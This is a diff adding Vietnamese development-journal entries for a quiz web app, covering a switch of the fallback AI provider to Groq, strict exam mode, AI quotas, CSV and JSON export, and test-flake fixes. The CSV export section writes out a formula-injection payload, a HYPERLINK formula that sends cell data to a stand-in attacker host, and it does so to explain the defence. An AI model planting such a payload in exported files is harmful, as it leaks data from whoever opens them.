@@ -44,6 +44,9 @@
 
 | 19/08 | **Cảnh báo gian lận live trong phòng đấu** (V20) — cờ riêng cho host, nhắc riêng, khuôn lặp thay vì đếm số lần, 30 test · phát hiện thiết kế đã chốt không khớp schema · sửa 1 test đỏ có sẵn trên `main` | 8/8 | 🟢 xong |
 
+| 20/08 | **Đổi dự phòng AI sang Groq** · **FR-48 thi nghiêm ngặt** (V21) · **FR-58 xuất bảng điểm CSV** · **FR-84 hạn mức AI** (V22) — 494 test BE / 67 FE · sửa 2 lỗi có sẵn | 13/13 | 🟢 xong — fallback đo thật, tìm & sửa 1 lỗi khi chạy thật |
+| 20/08 (chiều) | **Làm nốt 6 mục hoãn**: FR-11, FR-36, FR-32, FR-12, FR-64, FR-69 — hết mục ⏳ | 6/6 | 🟢 xong |
+
 > 🔴 chưa bắt đầu · 🟡 đang làm · 🟢 xong · 🔵 nghỉ/đệm
 
 ---
@@ -3009,6 +3012,337 @@ người một thông báo thành tích".
 
 Bài học giống hệt chuyện đối chứng dương ở trên: một test xanh/đỏ không nói gì nếu nó không kiểm đúng thứ tên
 nó ghi.
+
+---
+
+## 📅 T5 — 20/08/2026 — Đổi nhà cung cấp dự phòng sang Groq, và FR-48
+
+**Mục tiêu:** làm nốt các mục còn hoãn để hoàn thiện web.
+
+**Xong:** đổi provider dự phòng xAI Grok → **Groq** (17 test) · **FR-48 chế độ thi nghiêm ngặt** (V21,
+4 test backend + 7 test frontend). Backend 454 → 475, frontend 60 → 67.
+
+---
+
+### Đổi dự phòng sang Groq: sửa một lời hứa chưa bao giờ kiểm được
+
+Người hướng dẫn đề nghị dùng **Groq** thay **Grok**. Hai chữ khác đúng một ký tự nhưng là hai thứ khác
+hẳn — Groq (groq.com) là nhà cung cấp hạ tầng suy luận chạy mô hình mở, Grok là mô hình của xAI — nên đã
+hỏi lại cho chắc trước khi động vào, vì `CLAUDE.md` ghi rõ *"stack — không tự đổi"*.
+
+Lý do đổi không phải kỹ thuật mà là **kiểm chứng được**. Nhật ký ngày 10/08 đã chốt: *xAI không có gói
+miễn phí*, key hợp lệ vẫn trả 403 `permission-denied`. Suốt cả dự án, đường dự phòng **chưa một lần chạy
+thật**, và mục 3.6 phải ghi *"chưa demo được fallback"*.
+
+> Một đường dự phòng chưa từng chạy thì không ai biết nó có chạy hay không. Nó là một lời hứa, không phải
+> một tính năng — và trong báo cáo nó là một ô trống ở đúng chỗ hội đồng sẽ hỏi.
+
+Groq có gói miễn phí nên lần đầu tiên đo được cả chuỗi bằng số liệu thật.
+
+**Một cái được ngoài dự tính: Groq có streaming.** `GrokProvider` cũ thì không. Nghĩa là trước đây nếu
+Gemini chết, trợ lý học tập (features/08) **tắt hẳn** vì `AiOrchestrator.stream()` lọc theo
+`supportsStreaming()` và danh sách còn lại rỗng. Giờ chữ vẫn chảy.
+
+**Hai chỗ đọc chuỗi được test riêng** dù nhìn rất vặt, vì cả hai **hỏng trong im lặng**:
+- `bocManh` sai → luồng streaming chạy mà không ra chữ nào; người dùng thấy ô trống, không có lỗi để đọc.
+- `docRetryAfter` đọc nhầm đơn vị (Groq trả **giây**, không phải mili-giây) → hệ thống chờ 2ms rồi gọi
+  lại, đâm vào hạn mức lần nữa; vòng lặp đó nhìn giống *"provider dự phòng vô dụng"*.
+
+**Nhật ký cũ giữ nguyên, không sửa.** Các mục ngày 08/08 và 10/08 ghi đúng sự thật lúc đó; sửa lại thành
+"Groq" là làm sai hồ sơ. Chỉ tài liệu **mô tả hệ thống hiện tại** mới đổi: `CLAUDE.md`, `tech-stack.md`,
+`architecture.md`, `overview.md`, `database.md`, `roadmap.md`, và ba file nội dung báo cáo.
+
+**Còn nợ:** chưa có `GROQ_API_KEY` nên vẫn **chưa đo được** fallback. Code và tài liệu đã sẵn sàng; thiếu
+đúng một key miễn phí. Không được ghi số nào vào mục 3.6 cho tới khi chạy thật.
+
+### FR-48: đặc tả viết "bắt buộc fullscreen", mà trình duyệt không cho bắt buộc
+
+Đây là chỗ dễ hứa quá tay nhất trong cả tính năng 12. Sự thật kỹ thuật:
+
+| Trình duyệt cho | Trình duyệt KHÔNG cho |
+|---|---|
+| Vào toàn màn hình **từ một cú bấm của người dùng** | Tự vào khi trang mở |
+| Biết lúc người dùng thoát ra | Chặn phím Esc |
+| Chặn menu chuột phải | Chặn F12 / Ctrl+Shift+I |
+
+Nên tính năng làm ba việc: che đề cho tới khi người học **chủ động** bấm vào toàn màn hình; phát hiện lúc
+thoát và nhắc; để lại tín hiệu `FULLSCREEN_EXIT`. Giá trị thật là **biến việc rời bài thi thành có chủ ý và
+để lại dấu vết**, không phải dựng một bức tường.
+
+**Ba chỗ trong giao diện đều nói thật về giới hạn đó** — chữ trợ giúp ở form soạn quiz, cảnh báo ở trang
+giới thiệu, và cửa vào trước khi làm bài. Nói dối rằng *không thể* thoát là lời hứa mà ai cũng tự phát hiện
+sai ngay lần đầu bấm Esc; nguy hiểm hơn là **giáo viên tin vào một rào chắn không tồn tại** rồi bỏ qua việc
+rà soát tín hiệu — tức mất đúng thứ có tác dụng thật.
+
+**Ba quyết định giao diện, mỗi cái là một cặp đánh đổi:**
+
+| Quyết định | Vì sao không làm ngược lại |
+|---|---|
+| **Che đề** ở cửa vào, không chỉ hiện cảnh báo | Dải cảnh báo mà bên dưới vẫn đọc được đề thì chẳng ai bấm nút; chế độ nghiêm ngặt thành dòng chữ trang trí |
+| **Thoát giữa chừng thì chỉ nhắc**, không che lại | Che đi là phạt người bấm nhầm Esc bằng cách chặn họ làm tiếp, trong khi tín hiệu đã ghi rồi |
+| **Thiết bị không hỗ trợ vẫn cho làm bài** | Safari trên iPhone không có Fullscreen API cho phần tử thường; chặn là biến hạn chế thiết bị thành mất quyền dự thi |
+
+**Luật quan trọng nhất, và là chỗ dễ hỏng nhất:** API trả `strictExam` **đã tính cho từng lượt**
+(`quiz.strictExam && mode == EXAM`), không trả cờ thô của quiz. Trả cờ thô thì frontend phải tự nhớ nhân
+với chế độ ở **mọi** chỗ dùng, và một chỗ quên là người **luyện tập bị ép toàn màn hình** — vi phạm thẳng
+ràng buộc "luyện tập không bị theo dõi". Có test riêng cho đúng tình huống đó: cùng một quiz bật cờ, lượt
+EXAM nhận `true`, lượt PRACTICE nhận `false`.
+
+**Một cái bẫy nhỏ ở đường cập nhật:** `QuizRequest.strictExam` dùng `Boolean` bao chứ không phải `boolean`
+nguyên thuỷ. Client cũ không gửi trường này thì `null`, và service **giữ nguyên** giá trị đang có. Dùng
+kiểu nguyên thuỷ thì mỗi lần một form thiếu trường gọi cập nhật là âm thầm tắt cờ của chủ quiz. Có test
+riêng: sửa tiêu đề mà không gửi `strictExam` thì cờ vẫn bật.
+
+### Ghi chú báo cáo
+
+- **Mục 1.x (công nghệ):** phần so sánh nhà cung cấp AI phải sửa — bảng cũ ghi xAI Grok. Lý do đổi là một
+  ví dụ tốt cho *ràng buộc thực tế của gói miễn phí ảnh hưởng tới lựa chọn kiến trúc*.
+- **Mục 3.6:** vẫn **chưa được ghi số** cho fallback. Có key Groq thì đo ngay: tắt Gemini bằng cách để sai
+  key, gọi sinh đề, đo thời gian chuyển và xác nhận kết quả vẫn đúng cấu trúc.
+- **"Khó khăn & cách giải quyết":** FR-48 là ví dụ mẫu cho *đặc tả yêu cầu một thứ nền tảng không cho
+  phép* — và cách xử lý là làm phần làm được rồi **nói thật về phần không làm được**, thay vì đặt tên
+  tính năng nghe như đã làm được.
+- **Mục 3.4:** thêm 11 test, trong đó test "lượt luyện tập không bị áp cờ" là loại test giữ một **ràng
+  buộc của đặc tả**, không phải giữ một chi tiết kỹ thuật.
+
+---
+
+### FR-58 xuất bảng điểm: hoá ra CSV cũng có "hỏng lặng lẽ"
+
+Lý do hoãn cũ phân biệt rõ: *CSV rẻ, PDF cần thêm thư viện và phải lo font tiếng Việt — một chỗ hỏng lặng
+lẽ, chữ ra ô vuông, chỉ phát hiện khi mở file*. Làm CSV thì phát hiện **CSV có đúng ba lỗi cùng loại đó**:
+server trả 200, file tải về được, mở được, chỉ nội dung sai.
+
+| Luật | Không làm thì |
+|---|---|
+| **BOM UTF-8 đầu tệp** | Excel trên Windows không tự đoán UTF-8 cho `.csv`: "Nguyễn" thành "Nguyá»…n" |
+| **Thoát theo RFC 4180** | Một dấu phẩy trong tên người đẩy lệch cả hàng, điểm gán sang cột khác |
+| **Chặn tiêm công thức** | Tên bắt đầu bằng `=` `+` `-` `@` **chạy như công thức** khi giáo viên mở |
+
+Cái thứ ba là **lỗ hổng bảo mật thật**, không phải chuyện định dạng: tên hiển thị do người dùng tự đặt, nên
+một học sinh đặt tên là `=HYPERLINK("http://kẻ-xấu/?d="&A1,"Bấm vào")` thì ô đó chạy trên máy **giáo viên** —
+người không làm gì sai. Chặn bằng dấu nháy đơn đứng trước; **bọc ngoặc kép là không đủ**, Excel vẫn diễn
+giải công thức bên trong ngoặc kép. Ngoặc kép là luật *định dạng*, không phải luật *an toàn*.
+
+PDF vẫn không làm, ranh giới không đổi.
+
+### FR-84 hạn mức AI: làm phần chặn trước, ô nhập sau
+
+Mục này hoãn từ lát cắt 10 với lý do đáng giữ nguyên: *một ô nhập hạn mức không chặn được gì còn tệ hơn
+không có ô nào*, vì quản trị viên sẽ tin rằng chi phí đã bị giới hạn. Nên lần này làm đúng thứ tự — bộ đếm
+và điểm chặn trước, ô nhập cuối cùng.
+
+**`null` khác `0`, và cùng con số `0` mang hai nghĩa trái ngược:**
+
+| Giá trị | Nghĩa |
+|---|---|
+| `null` | Chưa đặt riêng → dùng mặc định hệ thống |
+| `0` do quản trị viên đặt | **Cấm** người này gọi AI |
+| `0` là mặc định hệ thống | **Chưa bật** hạn mức, không chặn ai |
+
+Phân biệt bằng **nguồn** của con số. Gộp lại thì hoặc không cấm được ai, hoặc mọi tài khoản mới bị cấm ngay
+từ lúc tạo — và triệu chứng sẽ là "AI hỏng", rất khó lần ra nguyên nhân.
+
+**Ba quyết định còn lại, mỗi cái tránh một cách hỏng khác nhau:**
+
+- **Đếm ở Redis nhưng dựng lại được từ `ai_request_logs`.** Redis chạy không bật AOF; không dựng lại thì một
+  lần restart là xoá hạn mức của cả hệ thống mà không ai nhận ra. Có test riêng chứng minh restart không
+  tặng thêm lượt cho ai.
+- **Đếm lượt của người dùng, không đếm lần thử lại.** Một lần sinh đề hỏng rồi thử lại 3 lần vẫn là *một*
+  lượt; đếm từng lần thử thì hạn mức phụ thuộc vào việc nhà cung cấp hôm nay có ổn định hay không.
+- **Lần bị chặn không tính là đã dùng** — không lùi bộ đếm thì con số ở khu quản trị leo mãi và mất nghĩa.
+
+**Nhúng học liệu không tính vào hạn mức:** một tài liệu chia 50 đoạn là 50 lời gọi `embed` cho *một* hành
+động; tính vào thì hạn mức 20 lượt hết ngay ở tài liệu đầu tiên.
+
+### Hai lỗi có sẵn moi ra được nhờ chạy full suite
+
+**1. `AiGradingIntegrationTest` đỏ hai lần theo hai kiểu, xanh khi chạy riêng.** Gốc: `reset(aiOrchestrator)`
+chạy trong khi luồng chấm nền của phép kiểm *trước* còn đang gọi mock — stub bị xoá giữa chừng, lời gọi trả
+null, câu bị đánh `AI_FAILED`. Vá từng test không hết; sửa gốc là **chờ luồng nền lắng xuống rồi mới reset**.
+
+**2. Neo4j deadlock ở `rebuildForUser` — lỗi thật, không phải flake.** Đọc stack thì thấy nó đi qua
+`rebuildForUser → syncPublicCatalog`, mà **vòng thử lại deadlock chỉ bọc đường `sync(attemptId)`**. Hai
+đường ghi vào *cùng những nút Quiz*, nên chạy song song thì đường không được bọc đổ ra thành lỗi 500 cho
+người dùng. Gom vòng thử lại thành một chỗ dùng chung cho cả hai. Thử lại **mỗi quiz riêng**, không bọc cả
+vòng lặp: bọc cả vòng thì một deadlock ở quiz thứ 50 làm chạy lại từ quiz đầu — vô ích, và làm tăng đúng
+thứ gây deadlock là thời gian giữ khoá.
+
+Bài học lặp lại lần thứ ba trong dự án: **chạy riêng một lớp test không đủ để kết luận nó đúng.**
+
+### Một sai lầm của chính em, ghi lại để không lặp
+
+Chạy `mvnw compile` và sửa mã nguồn **trong lúc `mvnw test` đang chạy nền** — cả ba dùng chung `target/`.
+Kết quả: một lượt 14 lỗi `Unable to find a @SpringBootConfiguration` và `NoClassDefFoundError`, không liên
+quan gì tới code. Mất một vòng chạy 10 phút để nhận ra. Từ đó làm tuần tự.
+
+### Ghi chú báo cáo
+
+- **Mục 3.4:** hai lỗi ở trên là ví dụ tốt cho *vì sao phải chạy full suite chứ không chỉ chạy lớp vừa sửa*.
+  Cái thứ hai đặc biệt đáng kể vì nó là **lỗi sản phẩm**, chỉ lộ ra dưới tải đồng thời.
+- **"Khó khăn & cách giải quyết":** FR-58 là ví dụ cho *một tính năng nhìn tưởng tầm thường lại chứa lỗ hổng
+  bảo mật* (tiêm công thức CSV). FR-84 là ví dụ cho *thứ tự làm quyết định tính năng có giá trị hay không*.
+- **Mục 2.8:** V21 và V22 đều là cột thêm vào bảng có sẵn, và cả hai đều có một quyết định về `null` —
+  `strict_exam` mặc định FALSE, `ai_daily_quota` mặc định NULL, vì hai lý do khác nhau.
+
+---
+
+### Có key Groq: đo thật, và ba điều bất ngờ
+
+**1. Model mặc định em chọn đã bị gỡ trước cả khi kịp chạy lần đầu.** Gọi `GET /openai/v1/models` trước
+khi đo thì `llama-3.3-70b-versatile` không còn trong danh sách. Đây là lần **thứ ba** dự án dính đúng
+chuyện này — sau `text-embedding-004` của Google và `grok-2` của xAI. Không kiểm trước thì cấu hình sẽ
+*trông như* đã có đường dự phòng trong khi nó không bao giờ chạy được. Đổi sang `openai/gpt-oss-120b`.
+
+**2. Ép Gemini hỏng bằng key sai thì Groq KHÔNG tiếp quản — và đó là đúng.** Bảng audit ghi rõ:
+`gemini | FAILED | HTTP 400`, không có dòng `groq` nào theo sau. `AiOrchestrator` chỉ chuyển nhà cung cấp
+khi lỗi **tạm thời** (429, 5xx, mất mạng); key sai là lỗi vĩnh viễn, gửi sang chỗ khác cũng hỏng y hệt.
+Đúng bài học đã ghi ngày 10/08 với Grok 403.
+
+Nhưng để phân biệt "đúng thiết kế" với "hỏng" thì phải có test nói rõ ranh giới — và **suốt cả dự án chưa
+có test nào cho chính đường chuyển provider**, thứ trung tâm của trụ cột AI. Lý do rất đơn giản và cũng rất
+đáng ngại: `GROK_API_KEY` luôn để trống nên provider dự phòng bị lọc ra ngay từ đầu, nghĩa là logic chuyển
+**chưa từng được thực thi** — không bởi người dùng, cũng không bởi test. Viết `AiOrchestratorFallbackTest`
+6 ca, phủ đúng ranh giới tạm thời / vĩnh viễn / chưa cấu hình / hỏng hết / streaming.
+
+**3. Groq nhanh hơn Gemini khoảng 5 lần trên cùng tác vụ.**
+
+| Nhà cung cấp | Số lượt | Độ trễ TB | Token vào | Token ra |
+|---|---:|---:|---:|---:|
+| Gemini `gemini-3.6-flash` | 18 | 10 526 ms | 1 072 | 549 |
+| Groq `openai/gpt-oss-120b` | 3 | **2 039 ms** | 658 | 586 |
+
+Sinh đề qua chính ứng dụng: **9/9 câu**, cả 9 qua được bộ kiểm cấu trúc `QuestionJsonParser`, tiếng Việt
+đúng dấu. Nhưng phải nói rõ để không ai đọc quá: Groq mới 3 lượt, và độ trễ của Gemini gồm cả những lần
+chạm hạn mức gói miễn phí phải chờ. Đây là **so sánh chỉ báo**, không phải phép đo hiệu năng có kiểm soát.
+
+**Phát biểu đúng cho báo cáo:** *nhà cung cấp dự phòng đã phục vụ thật qua ứng dụng, và logic chuyển đã
+được kiểm bằng test; còn một lần chuyển thật do lỗi tạm thời của Gemini thì chưa quan sát được* — muốn ép
+phải chặn mạng ở mức hệ điều hành vì Gemini hardcode base URL.
+
+---
+
+### Chạy thật trên server lộ ra một lỗi mà 500 test không bắt được
+
+Kiểm 13 điểm của FR-48/58/84 trên server đang chạy. Mười hai điểm xanh; điểm thứ mười ba đỏ:
+**người bị cấm gọi AI vẫn nhận `202 Accepted`** thay vì 429.
+
+Nguyên nhân là một thứ chỉ lộ ra khi ghép các tầng lại: tác vụ AI nặng **chạy nền**. Endpoint trả `jobId`
+ngay, còn lời gọi mô hình xảy ra sau ở luồng nền — nơi duy nhất có chốt hạn mức. Test tích hợp của FR-84
+gọi thẳng `AiQuotaService` nên không thấy; test của tầng job không biết gì về hạn mức.
+
+**Kiểm lại trước khi kết luận:** bảng audit cho thấy **0 lời gọi mô hình** sau lúc cấm, và job FAILED đúng
+thông báo hạn mức. Nghĩa là mục đích chính — khống chế chi phí — vẫn nguyên vẹn. Lỗi nằm ở *phản hồi cho
+người dùng*, không ở *hiệu lực của hạn mức*. Phân biệt được hai chuyện đó quyết định mức độ nghiêm trọng.
+
+**Cách sửa và cái bẫy trong đó:** thêm chốt ở lúc nhận việc. Nhưng chốt mới phải **chỉ kiểm, không cộng
+lượt** — cộng ở cả hai chỗ là trừ đôi, và người dùng mất một nửa hạn mức mà không có cách nào biết. Tách
+`kiemTra()` khỏi `kiemTraVaGhiNhan()`, dùng chung một hàm riêng quyết định "hạn mức áp cho người này là
+bao nhiêu" để hai đường không bao giờ hiểu khác nhau về cùng một con số.
+
+Thêm 4 test, trong đó một test kiểm đúng cái bẫy: gọi `kiemTra()` mười lần rồi khẳng định số lượt đã dùng
+vẫn là 0, và vẫn còn đủ hạn mức thật.
+
+> Bài học: **500 test xanh không thay được một lần chạy thật.** Lỗi này nằm ở chỗ nối giữa hai tầng mà mỗi
+> tầng đều có test riêng và đều đúng.
+
+---
+
+## 📅 T5 — 20/08/2026 (chiều) — Làm nốt 6 mục còn hoãn: hết mục ⏳
+
+**Xong:** FR-11 ảnh câu hỏi (V23) · FR-36 AI giải thích gợi ý · FR-32 thứ tự thích ứng · FR-12 xuất/nhập
+quiz · FR-64 phân hạng · FR-69 email. Backend 514 → **553 test**, frontend 67.
+
+**Không còn mục `⏳` nào.** Sáu mục còn lại đều là *bỏ có lý do* hoặc *làm một phần có lý do*, ghi rõ trong
+đặc tả: FR-44 (bỏ), FR-87 (ngoài phạm vi), FR-12/FR-58 (JSON và CSV, không làm PDF), FR-62 (chỉ toàn hệ
+thống), FR-70 (bỏ quiet hours).
+
+---
+
+### Hai mục từng hoãn vì "sẽ phải bịa số" — cách gỡ giống nhau
+
+**FR-64 phân hạng.** Lý do hoãn: *"chọn ngưỡng khi chưa có dữ liệu thật thì chỉ là số bịa"*. Đúng — với
+ngưỡng **điểm tuyệt đối**. "1000 điểm là Vàng" không dựa trên gì, và sai theo **hai chiều cùng lúc**: mùa ít
+người thì không ai đạt, mùa đông người thì ai cũng đạt.
+
+Gỡ bằng **vị trí tương đối**: top 10% Vàng, 25% tiếp theo Bạc. Ngưỡng rút ra từ phân bố thật của mùa ấy —
+thứ luôn tồn tại. Điểm mấu chốt: hạng 5 trong 10 người là nửa dưới bảng, hạng 5 trong 100 người là top 5%;
+ngưỡng tuyệt đối không phân biệt được. Dưới 10 người thì **không phân hạng ai** — "top 10% của 3 người" là
+câu vô nghĩa, và trao Vàng cho người đứng đầu trong ba người làm mất giá đúng huy hiệu đó ở mùa đông.
+
+**FR-36 giải thích gợi ý.** Lý do hoãn: *"tốn hạn mức AI cho mỗi lần mở trang"*. Lý do đó **gắt hơn** sau khi
+làm FR-84 sáng cùng ngày: giờ nó tiêu vào hạn mức của **chính người học**, tức họ bị phạt vì một tính năng
+họ không chủ động dùng. Gỡ bằng: lý do dạng mẫu luôn có sẵn (không tốn gì), AI chỉ chạy khi **bấm hỏi**, và
+cache 24 giờ.
+
+### FR-32: đặc tả nói "adaptive difficulty", nhưng cách hiểu thông thường phá nhiều thứ
+
+Chọn một *tập câu khác nhau* cho từng người thì hai người có **điểm không so được** — mà bảng xếp hạng theo
+quiz, bảng theo dõi lớp và thống kê quiz đều dựa trên giả định ngược lại. Nó cũng phá bất biến *"chốt đề lúc
+bắt đầu"*.
+
+Nên: **đổi thứ tự, không đổi bộ đề**, và chỉ ở chế độ luyện tập. Mọi câu vẫn được hỏi.
+
+**Lỗi tự bắt được trong code của mình:** chú thích viết *"theo thứ tự người học đã làm"* nhưng code chỉ lọc
+danh sách, tức giữ **thứ tự đề**. Vì chính thuật toán đã đổi thứ tự ở các bước trước nên hai thứ đó khác
+nhau — chuỗi đọc ra sai hoàn toàn. Có test dựng riêng ví dụ mà hai cách đọc cho **hai hướng ngược nhau**.
+
+### FR-12: chọn định dạng theo hình dạng dữ liệu, không theo thói quen
+
+Đặc tả ghi "JSON/CSV". Quiz là dữ liệu **lồng nhau** nên chỉ làm JSON; bảng điểm lớp (FR-58) vốn **phẳng**
+nên dùng CSV. Cùng một đặc tả, hai lựa chọn ngược nhau, vì hai hình dạng dữ liệu khác nhau.
+
+File là **nội dung đề**, không phải bản sao một dòng CSDL: không id (nhập vào máy khác sẽ ghi đè nhầm quiz
+người khác), không thống kê (quiz mới "có 500 lượt học" mà chưa ai làm), không ảnh (trỏ vào `uploads/` máy cũ).
+
+### FR-11: chỗ dễ hỏng không phải phần lưu mà là phần hiển thị
+
+Lưu ảnh xong mà DTO không mang theo thì ảnh nằm trong CSDL và **người học không bao giờ thấy** — cả tính năng
+vô nghĩa. Nên thêm `imageUrl` vào cả `AttemptQuestionResponse` lẫn `LiveQuestionView`. Phòng đấu để ảnh thấp
+hơn (`max-h-56`): nó tính điểm theo **tốc độ**, nên đẩy nút đáp án xuống dưới màn hình là trực tiếp lấy mất
+điểm của người chơi màn hình nhỏ.
+
+Tách `UploadedImagePath` dùng chung với ảnh bìa quiz, vì *"chỉ nhận ảnh của hệ thống này"* là **luật an
+toàn**: nhân đôi nó nghĩa là lần sau ai đó nới ở một chỗ mà quên chỗ kia, và **chỗ bị quên chính là lỗ hổng**.
+
+### FR-69: em hỏi thừa một câu
+
+Trước khi làm, em hỏi xin thêm `spring-boot-starter-mail` vào stack — vì lý do hoãn trong đặc tả nói ba thứ
+cần thiết "không có trong tech-stack.md". **Sai**: thư viện đó cùng toàn bộ `spring.mail` và `app.mail.from`
+đã nằm trong dự án từ features/01 cho OTP đặt lại mật khẩu. Đáng lẽ phải mở `pom.xml` ra xem trước khi hỏi.
+
+Hệ quả trực tiếp: suýt khai thư viện đó **lần thứ hai**, và Maven cảnh báo `duplicate declaration`. Bản đầu
+cũng lấy `spring.mail.host` làm dấu hiệu bật/tắt — mà host **có giá trị mặc định**, nên tính năng sẽ luôn
+"đang bật" và hệ thống cố gửi thư ngay lần chạy đầu, đúng thứ "mặc định tắt" muốn tránh. Dấu hiệu đúng là
+**tài khoản gửi**.
+
+Test dùng **SMTP thật trong bộ nhớ**, không mock: mock chỉ chứng minh code gọi đúng hàm, vẫn xanh khi thư
+thiếu người nhận hay sai mã hoá tiếng Việt. Phải **giải mã quoted-printable** mới so được chuỗi — và chính
+điều đó chứng minh charset khai báo đúng.
+
+### Ba flake nữa, và một bài học lặp lại
+
+| Flake | Gốc |
+|---|---|
+| `ChatIntegrationTest` (lần thứ **năm**) | `HttpClient` gộp kết nối keep-alive, mà luồng SSE kết thúc bằng việc **server** đóng stream — kết nối chết nằm lại trong bể, lần gửi sau nhận EOF. Lần trước đổi WebClient sang JDK client chỉ **đổi triệu chứng**. Không đặt được `Connection: close` (JDK cấm), nên dựng client mới mỗi lần gọi |
+| `IntegrityIntegrationTest` | So `occurred_at <= now()` tức so **đồng hồ JVM** với **đồng hồ trong container** — lệch 276ms đo được trên máy này |
+| `RecommendationIntegrationTest` | Đồng bộ nền từ `takeQuiz()` mang ảnh chụp cũ, về đích **sau** lần sync tường minh |
+
+Cả ba đều **xanh khi chạy riêng**. Bài học lặp lại lần thứ tư: *chạy riêng một lớp test không đủ để kết luận
+nó đúng*.
+
+**Và một sai lầm của chính em:** `mvnw test` sau vài lần chạy có lọc `-Dtest=` để lại lớp tổng hợp cũ trong
+`target/classes` → `NoClassDefFoundError` ở những lớp không liên quan. Mất hai vòng chạy mới nhận ra. Từ đó
+luôn `mvnw clean` trước lần chạy đầy đủ.
+
+### Ghi chú báo cáo
+
+- **Mục 2.8:** thêm V23 (`questions.image_url`). V21–V23 đều là cột thêm vào bảng có sẵn, và mỗi cột có một
+  quyết định về `null`/mặc định với lý do khác nhau — dùng được làm ví dụ cho phần thiết kế CSDL.
+- **"Khó khăn & cách giải quyết":** FR-64 và FR-36 là cặp ví dụ tốt — *cùng một lời phản đối ("sẽ phải bịa
+  số" / "sẽ tốn hạn mức"), gỡ được bằng cách đổi cách đặt vấn đề chứ không bằng cách làm bừa*.
+- **Mục 3.4:** ba flake ở trên đều là *lỗi của phép kiểm, không phải của sản phẩm* — nhưng cái thứ ba lộ ra
+  một tính chất thật của hệ thống (đồ thị gợi ý là view, nhất quán cuối cùng) nên đáng viết vào báo cáo.
 
 ---
 
